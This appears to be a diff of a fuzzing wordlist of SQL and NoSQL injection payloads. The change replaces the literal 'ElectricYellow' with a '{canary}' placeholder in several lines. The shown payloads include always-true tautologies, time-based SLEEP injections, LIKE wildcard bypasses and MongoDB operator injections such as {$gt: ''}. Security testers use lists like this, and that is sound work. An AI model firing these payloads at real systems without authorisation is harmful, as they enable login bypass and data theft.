@@ -34,7 +34,7 @@
 ?
 |
 |
-' } ], $comment:'ElectricYellow'
+' } ], $comment:'{canary}'
 {$gt: ''}
 [$ne]=1
 { $ne: 1 }
@@ -929,7 +929,7 @@ or SLEEP(5)='
 ) or sleep(__TIME__)='
 )) or sleep(__TIME__)="""
 )) or sleep(__TIME__)='
-' or 'ElectricYellow' like 'Electric%'
+' or '{canary}' like '{canary}%'
  or 'ElectricYellow' = 'Electric'+'Yellow'
 ' or 'ElectricYellow' = 'Electric'+'Yellow'
  or 'text' = n'text'
@@ -940,8 +940,8 @@ or SLEEP(5)='
 ' or uid like '%
 ' or uname like '%
 ' or uname like '%
- or 'ElectricYellow' = 'ElectricYellow'
-' or 'ElectricYellow' = 'ElectricYellow'
+ or '{canary}' = '{canary}'
+' or '{canary}' = '{canary}'
 ' or userid like '%
 ' or userid like '%
 ' or user like '%
@@ -951,8 +951,8 @@ or SLEEP(5)='
 ' or username like '%
  or username like char(37);
 ' or username like char(37);
- or 'ElectricYellow' in ('ElectricYellow')
-' or 'ElectricYellow' in ('ElectricYellow')
+ or '{canary}' in ('{canary}')
+' or '{canary}' in ('{canary}')
  OR x=x
  OR x=x#
  OR x=x-- 
